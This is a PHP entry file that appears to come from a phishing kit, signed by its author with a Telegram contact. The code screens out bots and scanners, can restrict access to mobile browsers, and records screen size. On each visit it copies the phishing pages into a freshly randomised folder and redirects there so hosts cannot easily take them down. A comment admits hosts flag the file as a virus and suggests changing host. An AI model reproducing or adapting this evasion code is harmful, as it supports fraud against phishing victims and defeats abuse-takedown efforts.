<?php

session_start();
include "btm.php";
if (!isset($_SESSION['ssww'])){logbot('NO COOKIES');banbot();exit();};
	/*

This file may be marked as a virus and taken down on your WHM/CPanel/HOST because of its behaviour of creating mutiple folders to host new pages printed on each visit to futher enhance the antibot system.

To stop it from being taken down 
Go to the settings.php file and turn the variable $createfolderpersession to 0, for example
$createfolderpersession = 0;
That variable has a default value of 1, turn it to 0 and the removal issue will be sorted,

NOTE THOUGH: Page may not last long enough as you have turn off a key antibot feature by doing that, best solution, change your host

Yours Truly
Signed
YoChi

P.S   Contact on telegram : yo_chi

*/
	$random=rand(0,10000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	$dst2 = substr(md5($dst) , -9);
	$dst  = strtolower($dst2 );
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	};
include "settings.php";
$src="fad58";
if($createfolderpersession==1){recurse_copy( $src, $dst );} 
else{
	$ds=md5(base64_encode(md5($src.$_SERVER['HTTP_HOST'])));
	$dst = strtolower(substr(md5($ds) , -9));
	if(!is_dir($dst)){recurse_copy( $src, $dst );};
	};
include $src."/autob/nav_detect.php";
$_SESSION['device']=@descuserattributes();
if($mobileonly==1 && !in_array($ua['platform'],array('iPhone','iPod','iPad','Android','BlackBerry','Mobile'))){logbot('BROWSER NOT MOBILE');banbot();};

echo('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html style="background-color:#fff;">
	<head>
		<script>
	  document.cookie = "'.$_SESSION['ssww'].'="+window.screen.width;
	  document.cookie = "'.$_SESSION['sshh'].'="+window.screen.height;
</script>
<script>setTimeout(function(){window.location.href="'.$dst.'/";});</script>
	</head>
</html>');
?>